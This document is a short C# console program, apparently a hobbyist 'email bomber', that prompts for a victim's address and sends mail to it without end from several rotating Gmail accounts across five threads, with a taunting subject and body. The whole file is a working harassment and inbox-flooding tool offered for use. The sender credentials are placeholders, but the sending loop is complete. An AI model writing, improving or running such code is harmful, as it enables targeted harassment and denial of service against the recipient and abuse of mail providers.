using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Mailer
{
    class Program
    {

        static void Main(string[] args)
        {
            Console.Title = "Made by levensles";
            Console.Write("Enter Email addy to spam: ");
            string receiver = Console.ReadLine();
            int acc = 0;
            List<string> keys = new List<string>();
            int threads = 5;
            int ex = 0;
           
            while (true)
            {
                for (int k = 0; k < threads; k++)
                {
                    int threadId = k;
                    new Thread(() =>
                    {
                        if (acc > 2)
                        {
                            acc = 0;
                        }

                        String[] EmailAccs = new string[] { "email", "email", "email" };
                        String[] EmailPass = new string[] { "pass", "pass", "pass" };
                        var fromAddress = new MailAddress(EmailAccs[acc], "daddy");
                        var toAddress = new MailAddress(receiver, "Skiddy");
                        string fromPassword = EmailPass[acc];
                        const string subject = "Minecraft News";
                        const string body = "Skids are being blasted down";

                        var smtp = new SmtpClient
                        {
                            Host = "smtp.gmail.com",
                            Port = 587,
                            EnableSsl = true,
                            DeliveryMethod = SmtpDeliveryMethod.Network,
                            UseDefaultCredentials = false,
                            Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                        };
                        using (var message = new MailMessage(fromAddress, toAddress)
                        {
                            Subject = subject,
                            Body = body
                        })
                        {
                            smtp.Send(message);

                            Console.WriteLine("Send Mail with account [" + EmailAccs[acc] + "]");
                        }

                        acc++;
                    }).Start();
                }
            }

        }
    }
}
